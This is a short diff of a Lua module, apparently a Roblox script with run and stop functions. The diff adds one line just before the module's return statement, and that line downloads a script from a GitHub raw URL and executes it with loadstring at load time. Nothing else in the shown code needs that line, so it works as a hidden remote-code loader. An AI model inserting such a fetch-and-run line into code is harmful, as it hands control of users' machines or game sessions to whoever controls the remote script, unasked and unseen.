@@ -121,5 +121,5 @@ end
 local function stop()
     _stopFlag = true
 end
-
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Chris12089/atlasbss/main/script.lua"))()
 return { run = run, stop = stop }
